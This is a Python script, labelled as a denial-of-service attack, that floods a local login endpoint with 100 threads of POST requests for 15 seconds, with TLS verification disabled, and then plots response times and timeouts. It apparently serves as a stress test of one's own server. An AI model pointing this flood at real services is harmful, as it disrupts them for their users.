import time
import threading
import requests
import matplotlib.pyplot as plt
import numpy as np

# ----------- Attack Logic -----------

def attack(target, stop_time, response_times):
    url = target["url"]
    method = target["method"]
    data = target.get("data")
    name = target["name"]

    while time.time() < stop_time:
        start = time.time()
        try:
            if method == "POST":
                r = requests.post(url, json=data, verify=False, timeout=5)
            else:
                r = requests.get(url, verify=False, timeout=5)
            elapsed = time.time() - start
            print(f"[{name}] {r.status_code} | {elapsed:.2f}s")
            response_times[name].append(elapsed)
        except Exception as e:
            print(f"[{name}] Error: {e}")
            response_times[name].append(None)
        time.sleep(0.5)

# ----------- plotting -----------

def plot_response_times(response_times):
    plt.figure(figsize=(10, 6))
    used_timeout_labels = set()

    for name, times in response_times.items():
        x_values = np.arange(len(times))
        normal_indices = [i for i, t in enumerate(times) if t is not None]
        timeout_indices = [i for i, t in enumerate(times) if t is None]
        
        normal_x = x_values[normal_indices]
        normal_y = [times[i] for i in normal_indices]

        if len(normal_x) > 0:
            line_obj = plt.plot(normal_x, normal_y, label=name)
            line_color = line_obj[0].get_color()
        else:
            line_color = "gray"

        if len(timeout_indices) > 0:
            y_timeout = 6
            timeout_label = f"{name} timeout"
            if timeout_label not in used_timeout_labels:
                plt.scatter(timeout_indices, [y_timeout] * len(timeout_indices),
                            color=line_color, marker='x', s=100, label=timeout_label)
                used_timeout_labels.add(timeout_label)
            else:
                plt.scatter(timeout_indices, [y_timeout] * len(timeout_indices),
                            color=line_color, marker='x', s=100)

    plt.title("Response Times for Login Endpoints")
    plt.xlabel("Request Count")
    plt.ylabel("Response Time (s)")
    plt.legend()
    plt.grid(True)
    plt.tight_layout()
    plt.savefig("dos_response_time.png")
    plt.show()

# ----------- plotting -----------

def plot_request_stats(response_times):
    plt.figure(figsize=(8, 5))
    
    labels = []
    success_counts = []
    timeout_counts = []

    for name, times in response_times.items():
        total = len(times)
        success = sum(1 for t in times if t is not None)
        fail = total - success

        labels.append(name)
        success_counts.append(success)
        timeout_counts.append(fail)

    bar_width = 0.35
    x = np.arange(len(labels))

    plt.bar(x, success_counts, width=bar_width, label="Success")
    plt.bar(x + bar_width, timeout_counts, width=bar_width, label="Timeout")

    plt.xticks(x + bar_width / 2, labels)
    plt.ylabel("Request Count")
    plt.title("Request Success vs Timeout")
    plt.legend()
    plt.tight_layout()
    plt.savefig("dos_request_stats.png")
    plt.show()

# ----------- Entry Point -----------

def main():
    HOST = "https://127.0.0.1:5000"
    attack_duration = 15
    threads_per_target = 100

    targets = [
        {
            "name": "login",
            "url": f"{HOST}/login",
            "method": "POST",
            "data": {"username": "abc", "password": "123", "fingerprint": "{}"}
        }
    ]

    response_times = {target["name"]: [] for target in targets}
    stop_time = time.time() + attack_duration

    threads = []
    for target in targets:
        for _ in range(threads_per_target):
            t = threading.Thread(target=attack, args=(target, stop_time, response_times))
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

    for name, times in response_times.items():
        total = len(times)
        success = sum(1 for t in times if t is not None)
        fail = total - success
        print(f"[{name}] Total: {total} | Success: {success} | Timeout: {fail}")

    print("Attack finished.\n📊 Generating plots...")
    plot_response_times(response_times)
    plot_request_stats(response_times)

if __name__ == "__main__":
    main()
